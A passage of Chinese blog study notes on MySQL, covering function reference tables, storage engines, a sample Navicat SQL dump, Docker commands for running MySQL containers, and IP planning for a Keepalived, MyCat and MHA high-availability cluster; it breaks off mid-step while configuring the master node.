<code>45</code></td></tr></tbody></table><hr><p>需要我单独为你做一张“开发中常用时间函数速查表”PDF或 Markdown 表格版本吗？可以贴在项目文档里当工具书用 😎</p><p>&#x3D;&#x3D;3.流程函数&#x3D;&#x3D;</p><table><thead><tr><th>函数</th><th>功能</th></tr></thead><tbody><tr><td>IF(value, a, b)</td><td>如果value为true，则返回a；否则返回b</td></tr><tr><td>IFNULL(a, b)</td><td>如果a不为空，则返回a；否则返回b</td></tr><tr><td>CASE WHEN [value] THEN […] [ELSE …] END</td><td>也是条件语句</td></tr></tbody></table><p>&#x3D;&#x3D;4.数字函数&#x3D;&#x3D;</p><table><thead><tr><th>函数</th><th>功能</th><th>举例</th></tr></thead><tbody><tr><td>CEIL(x)</td><td>向上取整</td><td>SELECT CEIL(4.2) AS ceil_value; – 结果：5 SELECT CEIL(-4.2) AS ceil_value; – 结果：-4</td></tr><tr><td>FLOOR(x)</td><td>向下取整</td><td>SELECT FLOOR(4.8) AS floor_value; – 结果：4 SELECT FLOOR(-4.8) AS floor_value; – 结果：-5</td></tr><tr><td>MOD(x, y)</td><td>返回x &#x2F; y的模</td><td>SELECT MOD(10, 3) AS mod_value; – 结果：1 SELECT MOD(10, 5) AS mod_value; – 结果：0</td></tr><tr><td>RAND()</td><td>返回0～1内的随机数</td><td>SELECT RAND() AS random_value; – 结果：例如：0.123456789</td></tr><tr><td>ROUND(x, y)</td><td>求取参数x的四舍五入值，保留小数点后y位</td><td>SELECT id, ROUND(number, 2) AS rounded_value FROM numbers;</td></tr></tbody></table><p>&#x3D;&#x3D;5.字符串函数&#x3D;&#x3D;</p><table><thead><tr><th>函数</th><th>功能</th><th>举例</th></tr></thead><tbody><tr><td>CONCAT(s1, s2, …, sn)</td><td>字符串连接，将s1, s2,…,sn几个字符串连接成一个字符串</td><td>SELECT LOWER(‘HeLLo WoRLd’) AS result; – 结果：’hello world’</td></tr><tr><td>LOWER(str)</td><td>返回字符串str的全小写字母</td><td>SELECT LOWER(‘HeLLo WoRLd’) AS result; – 结果：’hello world’</td></tr><tr><td>UPPER(str)</td><td>返回字符串str的全大写字母</td><td>SELECT UPPER(‘HeLLo WoRLd’) AS result; – 结果：’HELLO WORLD’</td></tr><tr><td>LTRIM(str)</td><td>返回字符串str去除左边空格的结果</td><td>SELECT LTRIM(‘ Hello World’) AS result; – 结果：’Hello World’</td></tr><tr><td>RTRIM(str)</td><td>返回字符串str去除右边空格的结果</td><td>SELECT RTRIM(‘Hello World ‘) AS result; – 结果：’Hello World’</td></tr><tr><td>TRIM(str)</td><td>返回字符串str去除前导和尾随空格的结果</td><td>SELECT TRIM(‘ Hello World ‘) AS result; – 结果：’Hello World’</td></tr><tr><td>SUBSTRING(str, pos, len)</td><td>返回字符串str从pos开始len个字符的字符串</td><td>SELECT SUBSTRING(‘Hello World’, 7, 5) AS result; – 结果：’World’</td></tr><tr><td>REPLACE(str, a, b)</td><td>返回字符串str，将其中的字符串a全部替换为字符串b</td><td>SELECT REPLACE(‘Hello World’, ‘World’, ‘MySQL’) AS result; – 结果：’Hello MySQL’</td></tr><tr><td>LPAD(str, len, pad)</td><td>返回字符串str从左边填充pad字符后，到len长度的结果</td><td>SELECT LPAD(‘Hello’, 10, ‘-‘) AS result; – 结果：’—–Hello’</td></tr><tr><td>RPAD(str, len, pad)</td><td>返回字符串str从右边填充pad字符后，到len长度的结果</td><td>SELECT RPAD(‘Hello’, 10, ‘-‘) AS result; – 结果：’Hello—–’</td></tr></tbody></table><hr><h3 id="6-常见存储引擎"><a href="#6-常见存储引擎" class="headerlink" title="6. 常见存储引擎"></a>6. 常见存储引擎</h3><table><thead><tr><th><strong>引擎</strong></th><th><strong>特点</strong></th><th><strong>适合场景</strong></th><th>当前状况</th></tr></thead><tbody><tr><td><strong>InnoDB（默认）</strong></td><td>支持事务、行级锁、外键约束、ACID 特性，性能优良。</td><td>高并发、事务性应用、需要保证数据一致性、支持外键约束的场景（例如在线交易系统、金融应用）</td><td>MySQL 默认引擎，功能强大，适合大多数场景，强烈推荐使用 InnoDB。</td></tr><tr><td><strong>MyISAM</strong></td><td>不支持事务和外键，支持表级锁，读性能高，写性能较差。</td><td>以读操作为主的场景，如数据仓库、日志分析、静态内容存储等</td><td>不推荐使用</td></tr><tr><td><strong>MEMORY</strong></td><td>数据存储在内存中，读写速度非常快，但数据会丢失。</td><td>临时表、缓存数据、临时存储数据的场景。适用于需要快速存取的临时数据处理（例如会话存储）</td><td>直接上手 Redis 它不香吗</td></tr><tr><td><strong>ARCHIVE</strong></td><td>高压缩、适合存储大量只读数据。支持 INSERT 但不支持 UPDATE。</td><td>存档数据、历史数据存储场景，特别是数据量大且访问频率较低的情况</td><td>适合存储历史数据，例如三个月前或三年前的数据，常用于数据归档。</td></tr><tr><td><strong>BLACKHOLE</strong></td><td>不存储数据，所有插入操作都被丢弃，读取为空。</td><td>数据复制、测试用的空引擎，模拟写入操作而不存储数据</td><td>临时测试场景，也不推荐使用</td></tr></tbody></table><hr><h3 id="7-SQL-脚本"><a href="#7-SQL-脚本" class="headerlink" title="7. SQL 脚本"></a>7. SQL 脚本</h3><p>SQL 文件（.sql 文件）通常用于存储数据库操作的 SQL 脚本，这些脚本包含各种数据库管理和操作命令。</p><p>我们可以手动编写 SQL 脚本，也可以使用工具如 Navicat，将已创建的表和数据库导出为 SQL 文件。通过在其他地方运行该 SQL 文件，我们可以轻松重建之前的表和数据库。SQL 文件不仅可以作为备份使用，还可以共享给他人。</p><p>&#x3D;&#x3D;1.导出 SQL 文件&#x3D;&#x3D;<br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AMySQL%20%E5%9F%BA%E7%A1%80/image-20250410104022257.png"></p><blockquote><p>[!NOTE] 注意事项</p><ol><li>这里将数据库导出为 SQL 文件，包含库、表和数据的创建。</li><li>也可以只导出表，运行 SQL 文件时不会创建数据库，而是将在当前数据库中创建表和数据。</li></ol></blockquote><p>&#x3D;&#x3D;2.运行 SQL 文件&#x3D;&#x3D;<br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AMySQL%20%E5%9F%BA%E7%A1%80/image-20250410104203864.png"></p><p>&#x3D;&#x3D;3.SQL 文件示例&#x3D;&#x3D;</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> Navicat Premium Data Transfer</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> Source Server         : 192.168.136.7</span><br><span class="hljs-comment"> Source Server Type    : MySQL</span><br><span class="hljs-comment"> Source Server Version : 80041 (8.0.41)</span><br><span class="hljs-comment"> Source Host           : 192.168.136.7:3306</span><br><span class="hljs-comment"> Source Schema         : test</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> Target Server Type    : MySQL</span><br><span class="hljs-comment"> Target Server Version : 80041 (8.0.41)</span><br><span class="hljs-comment"> File Encoding         : 65001</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> Date: 10/04/2025 10:42:42</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-keyword">SET NAMES</span> utf8mb4;<br><span class="hljs-keyword">SET</span> FOREIGN_KEY_CHECKS = <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">-- ----------------------------</span><br><span class="hljs-comment">-- Table structure for characters</span><br><span class="hljs-comment">-- ----------------------------</span><br><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-keyword">IF</span> <span class="hljs-keyword">EXISTS</span> `characters`;<br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `characters`  (<br>  `id` <span class="hljs-type">int</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> AUTO_INCREMENT,<br>  `<span class="hljs-type">name</span>` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-type">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8mb4 <span class="hljs-keyword">COLLATE</span> utf8mb4_unicode_ci <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,<br>  `<span class="hljs-keyword">alias</span>` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-type">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8mb4 <span class="hljs-keyword">COLLATE</span> utf8mb4_unicode_ci <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,<br>  `title` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-type">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8mb4 <span class="hljs-keyword">COLLATE</span> utf8mb4_unicode_ci <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,<br>  `affiliation` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-type">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8mb4 <span class="hljs-keyword">COLLATE</span> utf8mb4_unicode_ci <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,<br>  `power_level` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-type">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8mb4 <span class="hljs-keyword">COLLATE</span> utf8mb4_unicode_ci <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,<br>  `description` <span class="hljs-type">text</span> <span class="hljs-type">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8mb4 <span class="hljs-keyword">COLLATE</span> utf8mb4_unicode_ci <span class="hljs-keyword">NULL</span>,<br>  `status` <span class="hljs-type">varchar</span>(<span class="hljs-number">50</span>) <span class="hljs-type">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8mb4 <span class="hljs-keyword">COLLATE</span> utf8mb4_unicode_ci <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,<br>  <span class="hljs-keyword">PRIMARY KEY</span> (`id`) <span class="hljs-keyword">USING</span> BTREE<br>) ENGINE = InnoDB AUTO_INCREMENT = <span class="hljs-number">52</span> <span class="hljs-type">CHARACTER</span> <span class="hljs-keyword">SET</span> = utf8mb4 <span class="hljs-keyword">COLLATE</span> = utf8mb4_unicode_ci ROW_FORMAT = DYNAMIC;<br><br><span class="hljs-comment">-- ----------------------------</span><br><span class="hljs-comment">-- Records of characters</span><br><span class="hljs-comment">-- ----------------------------</span><br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `characters` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;姜子牙&#x27;</span>, <span class="hljs-string">&#x27;吕尚&#x27;</span>, <span class="hljs-string">&#x27;太师&#x27;</span>, <span class="hljs-string">&#x27;阐教&#x27;</span>, <span class="hljs-string">&#x27;天尊&#x27;</span>, <span class="hljs-string">&#x27;姜子牙是封神演义中的重要人物，辅佐周武王推翻商朝，封神榜上位列仙班&#x27;</span>, <span class="hljs-string">&#x27;已死&#x27;</span>);<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;4.运行建议&#x3D;&#x3D;<br>有人说 Navicat 运行速度较慢，我们可以考虑使用 SQLyog 进行运行。</p><hr><h3 id="NULL-值处理"><a href="#NULL-值处理" class="headerlink" title="NULL 值处理"></a>NULL 值处理</h3><ol><li>&#x3D;&#x3D;IS NULL&#x3D;&#x3D;：<ol><li>当列的值是 NULL,此运算符返回 true。</li></ol></li><li>&#x3D;&#x3D;IS NOT NULL&#x3D;&#x3D;：<ol><li>当列的值不为 NULL, 运算符返回 true。</li></ol></li><li>&#x3D;&#x3D;&lt; &#x3D; &gt;&#x3D;&#x3D;：<ol><li>比较操作符（不同于 &#x3D; 运算符），当比较的的两个值相等或者都为 NULL 时返回 true。</li></ol></li></ol><h1 id="——"><a href="#——" class="headerlink" title="——"></a>——</h1><p>不像redis，不强制读写分离，但推荐</p><h3 id="1-MySQL-最佳实践"><a href="#1-MySQL-最佳实践" class="headerlink" title="1. MySQL 最佳实践"></a>1. MySQL 最佳实践</h3><h4 id="1-1-高可用实现"><a href="#1-1-高可用实现" class="headerlink" title="1.1. 高可用实现"></a>1.1. 高可用实现</h4><ol><li>&#x3D;&#x3D;主从之间&#x3D;&#x3D;<ol><li>MySQL 集群采用主从复制架构</li><li>主从复制：</li><li>故障转移</li><li>主控制从：</li><li>实时备灾：</li><li>读写分离：</li><li>数据备份：</li></ol></li><li>&#x3D;&#x3D;主主之间&#x3D;&#x3D;：<ol><li>信息同步：</li><li>选举领导：</li></ol></li><li>&#x3D;&#x3D;负载均衡&#x3D;&#x3D;：<ol><li>使用 K8S 进行部署</li></ol></li><li>&#x3D;&#x3D;数据存储&#x3D;&#x3D;：<ol><li>存储位置：<ol><li>首选本地存储，如果使用 K8s 担心主节点迁移，数据丢失，可选择以下方式：</li><li>公有云（块存储）</li><li>私有云</li><li>主节点固定，即使用 nodelector，将 Master 固定在那上面，方式 Master 迁移没数据了，从节点迁移无所调谓，反正又会同步（慢点？）</li></ol></li><li>存储方法：<ol><li>MyCat 实现分片（分库分表）</li></ol></li></ol></li></ol><hr><h4 id="1-2-架构图"><a href="#1-2-架构图" class="headerlink" title="1.2. 架构图"></a>1.2. 架构图</h4><h4 id="1-3-流程图"><a href="#1-3-流程图" class="headerlink" title="1.3. 流程图"></a>1.3. 流程图</h4><h4 id="1-4-安全规划"><a href="#1-4-安全规划" class="headerlink" title="1.4. 安全规划"></a>1.4. 安全规划</h4><h4 id="1-5-节点规划"><a href="#1-5-节点规划" class="headerlink" title="1.5. 节点规划"></a>1.5. 节点规划</h4><h4 id="1-6-数据存储"><a href="#1-6-数据存储" class="headerlink" title="1.6. 数据存储"></a>1.6. 数据存储</h4><p>首选本地文件存储，如果是使用 K8S 搭建 MySQL 集群，</p><h3 id="2-Docker-安装-MySQL"><a href="#2-Docker-安装-MySQL" class="headerlink" title="2. Docker 安装 MySQL"></a>2. Docker 安装 MySQL</h3><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-title">docker pull mysql:</span>latest<br><br><br><span class="hljs-title">docker run --name mysql-container -e MYSQL_ROOT_PASSWORD=wq666666 -d -p 3306:3306 mysql:</span>latest<br><br><br><span class="hljs-title">docker run --name mysql-container -e MYSQL_ROOT_PASSWORD=my-secret-pw -d mysql:</span>latest<br>- `--name mysql-container`：指定容器的名称为 `mysql-container`。<br>- `-e MYSQL_ROOT_PASSWORD=my-secret-pw`：设置 MySQL 根用户的密码为 `my-secret-pw`。<br>- `-d`：让容器在后台运行。<br><span class="hljs-title">- `mysql:</span>latest`：指定要使用的 MySQL 镜像。<br><br></code></pre></td></tr></table></figure><h3 id="3-集群搭建"><a href="#3-集群搭建" class="headerlink" title="3. 集群搭建"></a>3. 集群搭建</h3><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AMySQL%20%E5%9F%BA%E7%A1%80/image-20250406182807697.png"></p><h3 id="4-一主多从-keepavlied-mycat-MHA"><a href="#4-一主多从-keepavlied-mycat-MHA" class="headerlink" title="4. 一主多从(keepavlied + mycat + MHA"></a>4. 一主多从(keepavlied + mycat + MHA</h3><p>&#x3D;&#x3D;1.MySQL 集群&#x3D;&#x3D;</p><table><thead><tr><th>IP</th><th>主机名</th><th>角色</th></tr></thead><tbody><tr><td>192.168.136.8</td><td>mysql-master<br></td><td>MySQL 主库 + Keepalived 主</td></tr><tr><td>192.168.136.9<br></td><td>mysql-slave1</td><td>MySQL 从库 + Keepalived 备</td></tr><tr><td>192.168.136.10<br></td><td>mysql-slave2</td><td>MySQL 从库 + Keepalived 备</td></tr><tr><td>192.168.136.100<br></td><td>mysql-vip</td><td>绑定在 MySQL 主库上的 VIP</td></tr></tbody></table><p>&#x3D;&#x3D;2.MyCat 集群&#x3D;&#x3D;</p><table><thead><tr><th>IP</th><th>主机名</th><th>角色</th></tr></thead><tbody><tr><td>192.168.136.12</td><td>mycat1</td><td>MyCat 主 + Keepalived 主</td></tr><tr><td>192.168.136.13</td><td>mycat2</td><td>MyCat 备 + Keepalived 备</td></tr><tr><td>192.168.136.101</td><td>mycat-vip</td><td>绑定在 MyCat 主上的 VIP</td></tr></tbody></table><p>&#x3D;&#x3D;3.MHA 集群&#x3D;&#x3D;</p><table><thead><tr><th>IP</th><th>主机名</th><th>角色</th></tr></thead><tbody><tr><td>192.168.136.16</td><td>mha1</td><td>MHA 主 + Keepalived 主</td></tr><tr><td>192.168.136.17</td><td>mha2</td><td>MHA 备 + Keepalived 备</td></tr><tr><td>192.168.136.20</td><td>mha-vip</td><td>绑定在 MHA 主上的 VIP</td></tr></tbody></table><ol><li>MySQL 集群环境搭建<ol><li>安装 Docker</li><li>安装 Keepalived</li></ol></li><li>MyCAT 集群环境搭建<ol><li>安装 MyCat</li><li>安装 Keepalived</li></ol></li><li>MHA 集群环境搭建<ol><li>安装 MHA</li><li>安装 Keepalived</li></ol></li><li>MHA 与 MyCat 和 MySQL ssh互通，无密码</li></ol><h3 id="5-非-K8S-环境"><a href="#5-非-K8S-环境" class="headerlink" title="5. 非 K8S 环境"></a>5. 非 K8S 环境</h3><h4 id="5-1-一主多从"><a href="#5-1-一主多从" class="headerlink" title="5.1. 一主多从"></a>5.1. 一主多从</h4><h5 id="5-1-1-MySQL-集群节点环境准备"><a href="#5-1-1-MySQL-集群节点环境准备" class="headerlink" title="5.1.1. MySQL 集群节点环境准备"></a>5.1.1. MySQL 集群节点环境准备</h5><table><thead><tr><th>IP</th><th>主机名</th></tr></thead><tbody><tr><td>136.8</td><td>mysql1</td></tr></tbody></table><p>&#x3D;&#x3D;1.修改主机名&#x3D;&#x3D;</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">hostnamectl</span> <span class="hljs-built_in">set-hostname</span> &lt;<span class="hljs-string">host-name</span>&gt;<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;1.安装和配置 Docker&#x3D;&#x3D;</p><p>&#x3D;&#x3D;2.安装 Keepalived 和其相关依赖&#x3D;&#x3D;</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1. 安装 Keepalived 相关依赖</span><br><span class="hljs-built_in">sudo</span> apt install -y conntrack libseccomp2<br><br><br><span class="hljs-comment"># 2. 安装 Keepalived</span><br><span class="hljs-built_in">sudo</span> apt-get install -y keepalived<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;3.创建数据持久化目录&#x3D;&#x3D;</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1. 模版</span><br><span class="hljs-built_in">mkdir</span> -p /data/mysql/&lt;host-name&gt;/conf /data/mysql/&lt;host-name&gt;/data<br><br><br><span class="hljs-comment"># 2. MySQL 1</span><br><span class="hljs-built_in">mkdir</span> -p /data/mysql/mysql1/conf /data/mysql/mysql1/data<br><br><br><span class="hljs-comment"># 3. MySQL 2</span><br><span class="hljs-built_in">mkdir</span> -p /data/mysql/mysql2/conf /data/mysql/mysql2/data<br><br><br><span class="hljs-comment"># 4. MySQL 3</span><br><span class="hljs-built_in">mkdir</span> -p /data/mysql/mysql3/conf /data/mysql/mysql3/data<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;4.安装 MySQL&#x3D;&#x3D;</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs livescript">docker run -d <span class="hljs-string">\</span>                             <span class="hljs-comment"># 以“后台模式”运行容器（detached mode）</span><br>  --name &lt;host-name&gt; <span class="hljs-string">\</span>                      <span class="hljs-comment"># 指定容器名称，建议替换 &lt;host-name&gt; 为具体名字，如 mysql-master</span><br>  -p <span class="hljs-number">3306</span>:<span class="hljs-number">3306</span> <span class="hljs-string">\</span>                            <span class="hljs-comment"># 将宿主机的 3306 端口映射到容器的 3306 端口（MySQL 默认端口）</span><br>  -e MYSQL_ROOT_PASSWORD=wq666666 <span class="hljs-string">\</span>        <span class="hljs-comment"># 设置 MySQL root 用户的初始密码</span><br>  -v /data/mysql/master/conf:/etc/mysql/conf.d <span class="hljs-string">\</span>   <span class="hljs-comment"># 挂载配置文件目录（宿主机 -&gt; 容器），方便修改 MySQL 配置</span><br>  -v /data/mysql/master/data:/<span class="hljs-keyword">var</span>/lib/mysql <span class="hljs-string">\</span>      <span class="hljs-comment"># 持久化数据目录，防止容器删除后数据丢失</span><br>  mysql:<span class="hljs-number">8.0</span> <span class="hljs-string">\</span>                               <span class="hljs-comment"># 使用 mysql 官方镜像，版本为 8.0</span><br>  --character-set-server=utf8mb4 <span class="hljs-string">\</span>         <span class="hljs-comment"># 设置 MySQL 服务器默认字符集为 utf8mb4（支持 Emoji 和多语言）</span><br>  --collation-server=utf8mb4_unicode_ci    <span class="hljs-comment"># 设置排序规则为 utf8mb4_unicode_ci，适用于多语言环境</span><br><br><br>docker run -d <span class="hljs-string">\</span><br>  --name &lt;host-name&gt; <span class="hljs-string">\</span><br>  -p <span class="hljs-number">3306</span>:<span class="hljs-number">3306</span> <span class="hljs-string">\</span><br>  -e MYSQL_ROOT_PASSWORD=wq666666 <span class="hljs-string">\</span><br>  -v <span class="hljs-regexp">/data/</span>&lt;host-name&gt;/master/conf:/etc/mysql/conf.d <span class="hljs-string">\</span><br>  -v <span class="hljs-regexp">/data/</span>&lt;host-name&gt;/master/data:/<span class="hljs-keyword">var</span>/lib/mysql <span class="hljs-string">\</span><br>  mysql:<span class="hljs-number">8.0</span> <span class="hljs-string">\</span><br>  --character-set-server=utf8mb4 <span class="hljs-string">\</span><br>  --collation-server=utf8mb4_unicode_ci<br><br><br>docker run -d <span class="hljs-string">\</span><br>  --name mysql1 <span class="hljs-string">\</span><br>  -p <span class="hljs-number">3306</span>:<span class="hljs-number">3306</span> <span class="hljs-string">\</span><br>  -e MYSQL_ROOT_PASSWORD=wq666666 <span class="hljs-string">\</span><br>  -v /data/mysql/mysql1/data:/<span class="hljs-keyword">var</span>/lib/mysql <span class="hljs-string">\</span><br>  mysql:<span class="hljs-number">8.0</span> <span class="hljs-string">\</span><br>  --character-set-server=utf8mb4 <span class="hljs-string">\</span><br>  --collation-server=utf8mb4_unicode_ci<br><br><br>docker run -d <span class="hljs-string">\</span><br>  --name mysql1 <span class="hljs-string">\</span><br>  -p <span class="hljs-number">3306</span>:<span class="hljs-number">3306</span> <span class="hljs-string">\</span><br>  -e MYSQL_ROOT_PASSWORD=wq666666 <span class="hljs-string">\</span><br>  -v /data/mysql/mysql1/conf:/etc/mysql/conf.d <span class="hljs-string">\</span><br>  -v /data/mysql/mysql1/data:/<span class="hljs-keyword">var</span>/lib/mysql <span class="hljs-string">\</span><br>  mysql:<span class="hljs-number">8.0</span> <span class="hljs-string">\</span><br>  --character-set-server=utf8mb4 <span class="hljs-string">\</span><br>  --collation-server=utf8mb4_unicode_ci<br><br><br>docker run -d <span class="hljs-string">\</span><br>  --name mysql2 <span class="hljs-string">\</span><br>  -p <span class="hljs-number">3306</span>:<span class="hljs-number">3306</span> <span class="hljs-string">\</span><br>  -e MYSQL_ROOT_PASSWORD=wq666666 <span class="hljs-string">\</span><br>  -v /data/mysql/mysql2/conf:/etc/mysql/conf.d <span class="hljs-string">\</span><br>  -v /data/mysql/mysql2/data:/<span class="hljs-keyword">var</span>/lib/mysql <span class="hljs-string">\</span><br>  mysql:<span class="hljs-number">8.0</span> <span class="hljs-string">\</span><br>  --character-set-server=utf8mb4 <span class="hljs-string">\</span><br>  --collation-server=utf8mb4_unicode_ci<br><br><br><br>docker run -d <span class="hljs-string">\</span><br>  --name mysql3 <span class="hljs-string">\</span><br>  -p <span class="hljs-number">3306</span>:<span class="hljs-number">3306</span> <span class="hljs-string">\</span><br>  -e MYSQL_ROOT_PASSWORD=wq666666 <span class="hljs-string">\</span><br>  -v /data/mysql/mysql3/conf:/etc/mysql/conf.d <span class="hljs-string">\</span><br>  -v /data/mysql/mysql3/data:/<span class="hljs-keyword">var</span>/lib/mysql <span class="hljs-string">\</span><br>  mysql:<span class="hljs-number">8.0</span> <span class="hljs-string">\</span><br>  --character-set-server=utf8mb4 <span class="hljs-string">\</span><br>  --collation-server=utf8mb4_unicode_ci<br></code></pre></td></tr></table></figure><hr><h5 id="5-1-2-部署-MySQL-集群"><a href="#5-1-2-部署-MySQL-集群" class="headerlink" title="5.1.2. 部署 MySQL 集群"></a>5.1.2. 部署 MySQL 集群</h5><ol><li><p>配置 MySQL 主从</p></li><li><p>在 MySQL1 上配置<br>1.配主库文件</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs routeros">1. 在 /data/mysql/mysql1/conf 路径下创建 